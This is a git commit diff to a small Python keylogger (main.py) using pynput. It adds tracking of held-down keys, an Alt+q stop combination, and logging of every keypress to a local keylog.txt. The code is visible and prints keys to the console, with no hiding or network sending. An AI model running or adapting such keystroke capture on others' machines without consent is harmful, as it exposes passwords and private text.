bb3278320a568106ac9451bf7c2af5e0749eea8d
djrusskof <benetto83@gmail.com>
2025-03-27 11:49:09 +0100

    Keep history of current pressed key(s). Add a key combination to stop the logger (ALT + q).

--- main.py
+++ main.py
@@ -1,23 +1,39 @@
 from pynput import keyboard
 
+
+# The key combination to check
+COMBINATION = {keyboard.Key.alt_l, keyboard.KeyCode.from_char('q')}
+
+
+# List to store the currently pressed keys
+current_keys = set()
+
 def on_press(key):
     try:
-        # Record normal keys
-        print(f"Key pressed: {key.char}")
+        if(current_keys.__contains__(key)):
+            return
+        
+        # Add the pressed key to the set of currently pressed keys
+        current_keys.add(key)
+
+        if all(k in current_keys for k in COMBINATION):
+            print("Keylogger stopped.")
+            return False
+        
+        # Record the currently pressed keys
+        print(f"Key(s) pressed: {', '.join([str(k) for k in current_keys])}")
         with open("keylog.txt", "a") as log_file:
-            log_file.write(f"{key.char}")
-    except AttributeError:
-        # Enregistre les touches spéciales (comme Shift, Ctrl, etc.)
-        print(f"Touche spéciale pressée: {key}")
-        with open("keylog.txt", "a") as log_file:
-            log_file.write(f"{key}")
+            log_file.write(f"Key(s) pressed: {', '.join([str(k) for k in current_keys])}\n")
+    except Exception as e:
+        print(f"Erreur: {e}")
 
 def on_release(key):
-    if key == keyboard.Key.esc:
-        # Arrête le keylogger si la touche 'Echap' est pressée
-        print("Keylogger arrêté.")
-        return False
+    try:
+        # Remove the released key from the set of currently pressed keys
+        current_keys.discard(key)
+    except Exception as e:
+        print(f"Erreur: {e}")
 
-# Démarre l'écoute des frappes au clavier
+# Start the keylogger
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
